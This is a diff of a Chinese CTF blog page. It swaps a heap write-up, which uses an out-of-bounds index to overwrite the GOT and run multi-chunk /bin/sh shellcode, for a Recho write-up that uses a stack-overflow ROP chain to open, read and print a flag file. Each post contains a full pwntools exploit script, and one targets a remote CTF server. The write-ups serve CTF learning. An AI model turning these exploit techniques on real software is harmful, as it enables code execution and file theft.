@@ -50,82 +50,47 @@
         <main id="main" class="site-main" role="main">
             <article id="post-1270" class="post-1270 post type-post status-publish format-standard hentry category-90 category-129 tag-149">
                 <header class="entry-header">
-                    <h1 class="entry-title">ctfpwn 一道数组越界的堆题</h1>
-                    <p class="entry-census">发布于 2020-11-19</p>
+                    <h1 class="entry-title">pwntools中判断输入是否结束</h1>
+                    <p class="entry-census">发布于 2020-11-28</p>
                     <hr>
                 </header>
                 <div class="neko">
-                    <!-- more -->
-<p><img src="https://czh11.github.io/post-images/1605793554457.png" alt="" loading="lazy"><br>
-没有限制v1的范围，导致数组的下标可以为任意值，造成数组越界。<br>
-<img src="https://czh11.github.io/post-images/1605793729793.jpg" alt="" loading="lazy"><br>
-没有开启NX，堆栈可执行，所以可以把shellcode写在堆上，堆申请的大小最大为8，所以要把shellcode写在多个堆块上，</p>
-<figure data-type="image" tabindex="1"><img src="https://czh11.github.io/post-images/1605793839389.jpg" alt="" loading="lazy"></figure>
-<p>同时写进去的最后一个字节会被置0，因此正真能写的只有7个字节。</p>
-<p>综上，我们可以申请任意地址的8个字节改为我们申请的堆块的指针，这里修改got表的内容让它跳转到我们shellcode的地址。</p>
-<p>Jmp short xxxx指令占用2字节，这条指令使用的是相对当前指令的下一条指令位置寻址的 。</p>
-<figure data-type="image" tabindex="2"><img src="https://czh11.github.io/post-images/1605793857686.jpg" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="3"><img src="https://czh11.github.io/post-images/1605793900510.jpg" alt="" loading="lazy"></figure>
+                    <p>攻防世界-Recho</p>
+<p>这题很容易发现是栈溢出，但是如何从while循环中退出来，困扰了很长时间，看来wp才发现pwntools中有一个io.shutdown('send')，帮助输入结束，然后就查看了一下字符串，发现有个flag，接下来就是如何从中读取出flag了，这里用open打开，用read读出，用printf打印出来，open的系统调用号是2，而且alarm是系统调用的函数，通过gdb调试找到syscall的偏移，然后就是构造payload了。</p>
+<figure data-type="image" tabindex="1"><img src="https://czh11.github.io/post-images/1606545634031.jpg" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://czh11.github.io/post-images/1606545642873.jpg" alt="" loading="lazy"></figure>
 <pre><code>#!/usr/bin/env python2
-#-*- coding:utf-8 -*
+#-*-coding:utf-8 -*
 from pwn import *
-p=process(&quot;./note-service2&quot;)
-#p=remote(&quot;220.249.52.133&quot;,42490)
-elf=ELF(&quot;./note-service2&quot;)
-print(hex(elf.got['free']))
 context.log_level='debug'
-context.arch='amd64'
-def add(index,content):
-    p.recvuntil('your choice&gt;&gt;')
-    p.sendline('1')
-    p.recvuntil('index')
-    p.sendline(str(index))
-    p.recvuntil('size')
-    p.sendline(str(8))    
-    p.recvuntil('content')
-    p.send(content)
-
-def delete(index):
-	p.recvuntil('your choice&gt;&gt;')
-	p.sendline('4')
-	p.recvuntil('index:')
-	p.sendline(str(index))
-
-&quot;&quot;&quot;
-;64位系统调用
-mov rdi,xxxx;&quot;/bin/sh&quot;的地址
-mov rax,0x3b;execve系统调用号
-mov rsi,0
-mov rdx,0
-sycall
-&quot;&quot;&quot;
-gdb.attach(p)
-add(0,'/bin/sh')# 向第一个chunk中写入/bin/sh
-add((elf.got['free']-0x2020A0)/8,asm('xor rsi,rsi')+'\x90\x90\xeb\x19')
-#把got表中free函数的指针覆盖为第二个chunk的指针
-#然后在第二个chunk中写入
-#xor rsi,rsi
-#nop
-#nop
-#jmp 0x19
-add(1,asm('push 0x3b\n pop rax')+'\x90\x90\xeb\x19')
-#mov rax,0x3b的机器码站7个字节,而push 0x3b;pop rax只占3个字节
-#push 0x3b
-#pop rax
-#nop
-#nop
-#jmp 0x19
-add(2,asm('xor rdx,rdx')+'\x90\x90\xeb\x19')
-#
-add(3,asm('syscall')+'\x90'*5)
-
-delete(0)
-#因为got表的free函数的地址被修改为我们第二个chunk的地址了,
-#所以我们调用free的时候就跳转到了我们第二个chunk的数据段,
-#因为这是一个64位程序的函数调用，所以程序会把我们第一个chunk的数据区的指针放入RDI;
-#在64位的程序中,当参数少于7个时,参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。
-
-p.interactive()
+r=process(&quot;./Recho&quot;)
+r=remote(&quot;220.249.52.133&quot;,38037)
+elf=ELF(&quot;./Recho&quot;)
+write_plt=elf.plt['write']
+read_plt=elf.plt['read']
+alarm_plt=elf.plt['alarm']
+alarm_got=elf.got['alarm']
+printf_plt=elf.plt['printf']
+pop_rdi=0x00000000004008a3
+pop_rsi=0x00000000004008a1
+pop_rdx=0x00000000004006fe
+pop_rax=0x00000000004006fc
+add_rdi_al=0x000000000040070d
+flag=0x0601058
+bss=0x0601090
+payload='a'*0x38
+payload+=p64(pop_rdi)+p64(alarm_got)+p64(pop_rax)+p64(0x5)+p64(add_rdi_al)
+payload+=p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(0)+p64(pop_rax)+p64(0x2)+p64(alarm_plt)
+payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x500)+p64(0)+p64(pop_rdx)+p64(0x50)+p64(read_plt)
+payload+=p64(pop_rdi)+p64(bss+0x500)+p64(printf_plt)
+r.recvuntil(&quot;Welcome to Recho server!&quot;)
+r.sendline(str(0x200))
+payload=payload.ljust(0x200,'\x00')
+r.sendline(payload)
+r.recv()
+r.shutdown('send')
+r.interactive()
+r.close
 </code></pre>
 
                 </div>
@@ -136,16 +101,16 @@ p.interactive()
         <div class="mdui-container">
             <div class="mdui-row">
                 
-                <a href="https://czh11.github.io/post/pwntools-zhong-pan-duan-shu-ru-shi-fou-jie-shu/" class="mdui-ripple mdui-color-theme mdui-col-xs-2 mdui-col-sm-6 doc-footer-nav-left">
+                <div class="mdui-col-xs-2 mdui-col-sm-6 doc-footer-nav-left"></div>
+                
+                
+                <a href="https://czh11.github.io/post/ctfpwn-yi-dao-shu-zu-yue-jie-de-dui-ti/" class="mdui-ripple mdui-color-theme mdui-col-xs-10 mdui-col-sm-6 doc-footer-nav-right">
                     <div class="doc-footer-nav-text">
-                        <i class="mdui-icon material-icons">arrow_back</i>
-                        <span class="doc-footer-nav-direction mdui-hidden-xs-down">上一篇文章</span>
-                        <div class="doc-footer-nav-chapter mdui-hidden-xs-down">pwntools中判断输入是否结束</div>
+                        <i class="mdui-icon material-icons">arrow_forward</i>
+                        <span class="doc-footer-nav-direction">下一篇文章</span>
+                        <div class="doc-footer-nav-chapter">ctfpwn 一道数组越界的堆题</div>
                     </div>
                 </a>
-                
-                
-                <div class="mdui-col-xs-2 mdui-col-sm-6 doc-footer-nav-left"></div>
                 
             </div>
         </div>
